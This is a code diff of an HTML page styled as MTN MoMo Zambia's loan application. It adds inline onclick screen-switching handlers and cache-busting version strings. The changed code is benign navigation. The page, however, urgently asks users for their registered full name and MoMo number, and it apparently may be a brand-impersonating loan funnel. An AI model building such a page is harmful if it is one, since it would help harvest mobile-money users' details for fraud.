@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125" />
+  <link rel="stylesheet" href="style.css?v=20261125c" />
 </head>
 <body>
   <div class="app-container">
@@ -35,7 +35,12 @@
           <li><strong>• ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER TO AVOID DELAYS.</strong></li>
           <li><strong>• APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</strong></li>
         </ul>
-        <button id="btn-goto-slider" class="btn-momo-primary" type="button">
+        <button
+          id="btn-goto-slider"
+          class="btn-momo-primary"
+          type="button"
+          onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-slider').classList.add('active');window.scrollTo(0,0);"
+        >
           <span>GET STARTED</span>
           <small>CHECK LOAN ELIGIBILITY</small>
         </button>
@@ -58,7 +63,12 @@
       </div>
 
       <div class="sub-nav-strip">
-        <button id="btn-slider-back" class="nav-back-btn" type="button">← Back</button>
+        <button
+          id="btn-slider-back"
+          class="nav-back-btn"
+          type="button"
+          onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-welcome').classList.add('active');window.scrollTo(0,0);"
+        >← Back</button>
         <span class="sub-nav-title">Loan Calculator</span>
       </div>
 
@@ -86,7 +96,12 @@
             <h2 id="monthly-rep-val">ZMW 2,292</h2>
           </div>
 
-          <button id="btn-goto-form1" class="btn-momo-solid" type="button">CONTINUE APPLICATION</button>
+          <button
+            id="btn-goto-form1"
+            class="btn-momo-solid"
+            type="button"
+            onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);"
+          >CONTINUE APPLICATION</button>
         </div>
       </div>
     </section>
@@ -102,7 +117,12 @@
       </div>
 
       <div class="sub-nav-strip">
-        <button id="btn-form1-back" class="nav-back-btn" type="button">← Back</button>
+        <button
+          id="btn-form1-back"
+          class="nav-back-btn"
+          type="button"
+          onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-slider').classList.add('active');window.scrollTo(0,0);"
+        >← Back</button>
         <span class="sub-nav-title">Loan Application</span>
       </div>
 
@@ -408,7 +428,7 @@
 
   </div>
 
-  <script src="script.js?v=20261125"></script>
+  <script src="script.js?v=20261125c"></script>
 </body>
-  </html>
-            
+      </html>
+  
